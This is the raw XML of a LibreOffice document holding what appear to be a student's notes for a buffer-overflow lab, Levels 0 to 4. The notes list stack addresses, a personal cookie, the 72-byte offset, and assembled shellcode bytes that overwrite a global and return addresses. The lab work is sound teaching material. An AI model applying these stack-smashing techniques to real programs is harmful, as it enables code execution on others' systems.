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f00" officeooo:paragraph-rsid="001b8f00"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001b8f00" officeooo:paragraph-rsid="00213850"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001b8f00" officeooo:paragraph-rsid="0024bfa9"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001bf72a" officeooo:paragraph-rsid="001bf72a"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001cef8b" officeooo:paragraph-rsid="001cef8b"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001cef8b" officeooo:paragraph-rsid="00213850"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001cef8b" officeooo:paragraph-rsid="0024bfa9"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00213850" officeooo:paragraph-rsid="00213850"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001cef8b" officeooo:paragraph-rsid="001cef8b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00213850" officeooo:paragraph-rsid="00213850" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0022c5f0" officeooo:paragraph-rsid="0022c5f0" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0030a20e" officeooo:paragraph-rsid="0030a20e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="002a185b" officeooo:paragraph-rsid="003499e8" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0022c5f0" officeooo:paragraph-rsid="0022c5f0"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00213850" officeooo:paragraph-rsid="0024bfa9" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00213850" officeooo:paragraph-rsid="003499e8" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00264d24" officeooo:paragraph-rsid="00264d24" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0027b553" officeooo:paragraph-rsid="0027b553" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002803f6" officeooo:paragraph-rsid="002803f6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002803f6" officeooo:paragraph-rsid="002a185b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002803f6" officeooo:paragraph-rsid="002de2a5" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002b2f6d" officeooo:paragraph-rsid="002b2f6d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002de2a5" officeooo:paragraph-rsid="002de2a5" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002bf2bb" officeooo:paragraph-rsid="002bf2bb" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002bf2bb" officeooo:paragraph-rsid="002de2a5" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002df9ed" officeooo:paragraph-rsid="002df9ed" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00318631" officeooo:paragraph-rsid="00318631" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0030a20e" officeooo:paragraph-rsid="0030a20e" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0032971f" officeooo:paragraph-rsid="0032971f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001cef8b" officeooo:paragraph-rsid="003499e8" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001cef8b" officeooo:paragraph-rsid="00362f5f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001b8f00" officeooo:paragraph-rsid="003499e8" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002a185b" officeooo:paragraph-rsid="003499e8" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001f5b56"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00213850"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00349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vel 0</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Personal Cookie</text:span>: 0x5c5a094e</text:p>
      <text:p text:style-name="P4">Smoke: 0x8048c58</text:p>
      <text:p text:style-name="P5">%ebp: 0x55683670</text:p>
      <text:p text:style-name="P6">%<text:span text:style-name="T2">esp: 0x55683628</text:span></text:p>
      <text:p text:style-name="P8">$ebp-$esp: 0x48 =&gt; 72</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P10">Level 1</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">Personal Cookie</text:span>: 0x5c5a094e</text:p>
      <text:p text:style-name="P6">%ebp: 0x55683670</text:p>
      <text:p text:style-name="P6">%<text:span text:style-name="T2">esp: 0x55683628</text:span></text:p>
      <text:p text:style-name="P8">$ebp-$esp: 0x48 =&gt; 72</text:p>
      <text:p text:style-name="P8">&amp;fizz: 0x8048c82</text:p>
      <text:p text:style-name="P14">last 00 00 00 00: return address of getbuf (random trash)</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P11">Level 2</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">Personal Cookie</text:span>: 0x5c5a094e</text:p>
      <text:p text:style-name="P7">%ebp: 0x55683670</text:p>
      <text:p text:style-name="P7">%<text:span text:style-name="T2">esp: 0x55683628</text:span></text:p>
      <text:p text:style-name="P15">$ebp-$esp: 0x48 =&gt; 72</text:p>
      <text:p text:style-name="P17">print/a &amp;bang: 0x8048cdd</text:p>
      <text:p text:style-name="P18">print/a &amp;global_value: 0x804d200</text:p>
      <text:p text:style-name="P22">x/x <text:s/>$ebp: 0x55683670</text:p>
      <text:p text:style-name="P22">$ebp+8: 0x55683678</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P19">00000000 &lt;.text&gt;: </text:p>
      <text:p text:style-name="P19"><text:s text:c="3"/>0:<text:tab/>c7 05 00 d2 04 08 4e <text:tab/>movl <text:s text:c="2"/>$0x5c5a094e,0x804d200 </text:p>
      <text:p text:style-name="P19"><text:s text:c="3"/>7:<text:tab/>09 5a 5c </text:p>
      <text:p text:style-name="P19"><text:s text:c="3"/>a:<text:tab/>68 dd 8c 04 08 <text:s text:c="6"/><text:tab/>push <text:s text:c="2"/>$0x8048cdd </text:p>
      <text:p text:style-name="P20"><text:s text:c="3"/>f:<text:tab/>c3 <text:s text:c="18"/><text:tab/><text:tab/>ret</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P13">Level 3</text:p>
      <text:p text:style-name="P33">Personal Cookie: 0x5c5a094e</text:p>
      <text:p text:style-name="P30">%ebp: 0x55683670</text:p>
      <text:p text:style-name="P30">%<text:span text:style-name="T2">esp: 0x55683628</text:span></text:p>
      <text:p text:style-name="P16">$ebp-$esp: 0x48 =&gt; 72</text:p>
      <text:p text:style-name="P24">0x08048e27 &lt;+15&gt;:<text:tab/>call <text:s text:c="2"/>0x80492f3 &lt;getbuf&gt; </text:p>
      <text:p text:style-name="P25">0x08048e2c &lt;+20&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%ebx </text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P28">00000000 &lt;.text&gt;: </text:p>
      <text:p text:style-name="P28"><text:s text:c="3"/>0:<text:tab/>b8 4e 09 5a 5c <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x5c5a094e,%eax </text:p>
      <text:p text:style-name="P28"><text:s text:c="3"/>5:<text:tab/>bd f0 36 68 55 <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x556836f0,%ebp </text:p>
      <text:p text:style-name="P28"><text:s text:c="3"/>a:<text:tab/>68 2c 8e 04 08 <text:s text:c="6"/><text:tab/>push <text:s text:c="2"/>$0x8048e2c </text:p>
      <text:p text:style-name="P28"><text:s text:c="3"/>f:<text:tab/>c3 <text:s text:c="18"/><text:tab/><text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">x/x $ebp: 0x556836f0</text:p>
      <text:p text:style-name="P26">input string: 0x55683678</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P12">Level 4</text:p>
      <text:p text:style-name="P32"><text:soft-page-break/><text:span text:style-name="T1">Personal Cookie</text:span>: 0x5c5a094e</text:p>
      <text:p text:style-name="P31">%ebp: 0x55683670<text:span text:style-name="T3">(getbuf), 0x556836f0(test)</text:span></text:p>
      <text:p text:style-name="P31">%<text:span text:style-name="T2">esp: 0x55683628(getbuf), 0x556836ec(test)</text:span></text:p>
      <text:p text:style-name="P16">$ebp-$esp: 0x48 =&gt; 72</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">print/a &amp;createFile: 0x8048de3</text:p>
      <text:p text:style-name="P27">print/a &amp;uniqueFileName: 0x804c0c</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29">00000000 &lt;.text&gt;: </text:p>
      <text:p text:style-name="P29"><text:s text:c="3"/>0:<text:tab/>8d 6c 24 24 <text:s text:c="9"/><text:tab/>lea <text:s text:c="3"/>0x24(%esp),%ebp </text:p>
      <text:p text:style-name="P29"><text:s text:c="3"/>4:<text:tab/>b8 4e 09 5a 5c <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x5c5a094e,%eax </text:p>
      <text:p text:style-name="P29"><text:s text:c="3"/>9:<text:tab/>ff 35 1f 8f 04 08 <text:s text:c="3"/><text:tab/>pushl <text:s/>0x8048f1f </text:p>
      <text:p text:style-name="P29"><text:s text:c="3"/>f:<text:tab/>c3 <text:s text:c="18"/><text:tab/><text:tab/>ret</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"/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01:53.237871572</meta:creation-date>
    <dc:date>2015-03-06T19:11:02.047237153</dc:date>
    <meta:editing-duration>PT2H50M13S</meta:editing-duration>
    <meta:editing-cycles>14</meta:editing-cycles>
    <meta:generator>LibreOffice/4.2.7.2$Linux_X86_64 LibreOffice_project/420m0$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="53" meta:word-count="199" meta:character-count="1427" meta:non-whitespace-character-count="1092"/>
  </office:meta>
</office:document-meta>
</file>